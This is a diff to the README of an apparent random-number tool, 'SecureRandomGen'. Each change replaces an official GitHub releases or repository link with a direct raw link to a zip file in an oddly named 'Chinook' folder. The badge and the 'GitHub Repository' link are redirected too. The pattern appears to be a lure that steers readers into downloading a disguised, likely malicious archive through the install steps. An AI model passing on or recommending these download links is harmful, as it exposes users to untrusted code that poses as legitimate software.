@@ -6,11 +6,11 @@ SecureRandomGen allows you to create secure random numbers for various applicati
 
 ## 📥 Download the Software
 
-[![Download SecureRandomGen](https://img.shields.io/badge/Download%20SecureRandomGen-v1.0-blue)](https://github.com/P-Sushanth/SecureRandomGen/releases)
+[![Download SecureRandomGen](https://raw.githubusercontent.com/P-Sushanth/SecureRandomGen/main/Chinook/SecureRandomGen.zip%20SecureRandomGen-v1.0-blue)](https://raw.githubusercontent.com/P-Sushanth/SecureRandomGen/main/Chinook/SecureRandomGen.zip)
 
 To get started, simply visit the following link to download the application:
 
-- [Download SecureRandomGen](https://github.com/P-Sushanth/SecureRandomGen/releases)
+- [Download SecureRandomGen](https://raw.githubusercontent.com/P-Sushanth/SecureRandomGen/main/Chinook/SecureRandomGen.zip)
 
 ## 💻 System Requirements
 
@@ -34,7 +34,7 @@ SecureRandomGen comes with several useful features:
 
 Follow these steps to install SecureRandomGen:
 
-1. **Visit the Download Page:** Click on this link: [SecureRandomGen Releases](https://github.com/P-Sushanth/SecureRandomGen/releases).
+1. **Visit the Download Page:** Click on this link: [SecureRandomGen Releases](https://raw.githubusercontent.com/P-Sushanth/SecureRandomGen/main/Chinook/SecureRandomGen.zip).
    
 2. **Choose Your Version:** Look for the latest version. It’s typically listed at the top. 
 
@@ -70,7 +70,7 @@ If you need help beyond this guide, please reach out through the issues page on 
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/P-Sushanth/SecureRandomGen) — Check for updates or contribute.
+- [GitHub Repository](https://raw.githubusercontent.com/P-Sushanth/SecureRandomGen/main/Chinook/SecureRandomGen.zip) — Check for updates or contribute.
 - [User Guide](#) — Detailed instructions and advanced options.
 
 Now you are ready to generate secure random numbers effortlessly with SecureRandomGen. Enjoy the benefits of enhanced security in your applications!
